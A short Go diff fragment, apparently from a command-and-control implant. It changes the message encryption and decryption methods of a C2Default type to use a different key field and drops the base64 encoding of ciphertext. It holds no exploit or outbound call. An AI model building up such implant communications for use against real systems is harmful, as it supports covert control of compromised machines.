-	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesEncrypt(key, msg)
 }
 
 func (c *C2Default) decryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
-	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
-	return crypto.AesDecrypt(key, decMsg)
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesDecrypt(key, msg)
 }
